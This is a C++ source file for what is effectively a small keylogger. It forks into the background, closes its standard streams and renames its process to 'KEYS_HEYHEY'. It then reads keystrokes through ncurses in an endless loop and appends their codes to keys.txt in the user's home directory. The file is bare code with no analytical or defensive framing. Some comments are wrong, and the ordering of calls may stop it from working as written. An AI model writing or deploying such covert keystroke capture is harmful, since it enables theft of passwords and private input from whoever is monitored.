
#include <cstdlib>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <iostream>
#include <ncurses.h>
#include <fstream>
#include <sys/prctl.h>

void handleSignal(int signal) {
    // Handle signals here, e.g., clean up resources, terminate gracefully
    // This function will be called when a signal is received.
    // You should add your application-specific logic here.
    if (signal == SIGTERM || signal == SIGINT) {
        // Termination signals received, clean up and exit.
        std::cout << "Received termination signal. Exiting gracefully..." << std::endl;
        exit(0);
    }
}

int main() {
    // Fork the process
    pid_t pid = fork();

    if (pid < 0) {
        std::cerr << "Fork failed." << std::endl;
        return 1;
    }

    if (pid > 0) {
        // Parent process: Exit
        return 0;
    }

    std::string file(std::getenv("HOME"));
    file = file + "/keys.txt";
    std::ofstream new_file;
    // std::cout << file << std::endl;
    new_file.open(file, std::ios::app);
    if (!new_file.is_open()) {
        std::cerr << "Error opening file for append." << std::endl;
        return 1;
    }

    // Child process: Continue as a daemon
    // umask(0); // Set the file permission mask
    // setsid(); // Create a new session and become the leader of the session
    // chdir("/"); // Change working directory to root or a safe location

    // Close standard file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // Handle signals (e.g., for clean shutdown)
    signal(SIGTERM, handleSignal);
    signal(SIGINT, handleSignal);

    // Run your program's main functionality here

    // Initialize ncurses
    initscr();
    cbreak(); // Disable line buffering
    noecho(); // Disable automatic echoing of typed characters
    keypad(stdscr, TRUE); // Enable special keys
    prctl(PR_SET_NAME, "KEYS_HEYHEY", 0, 0, 0);
    // if (new_file.fail()) {
    //     std::cerr << "Error writing to file." << std::endl;
    //     break;
    // }
    while (true) {

        // Loop to read keys
        // Process the pressed key (ch)
        // Example: Print the key's ASCII value
        // printw("Key pressed: %d\n", ch);
        int ch;
        int check = 0;
        while ((ch = getch()) != ERR)
        {
            new_file << ch;
            new_file.flush();
            refresh();
            check = 1;
        }
        if (check == 1)
            new_file << std::endl;
        // Cleanup

        // If you want to run in the background, this loop would typically do some work
        // and periodically sleep to avoid consuming excessive resources.
        usleep(50); // Example: Sleep for 1 second
    }

    // Daemon-specific cleanup (if needed) should be handled by the handleSignal function.
    endwin();
    new_file.close();
    return 0;
}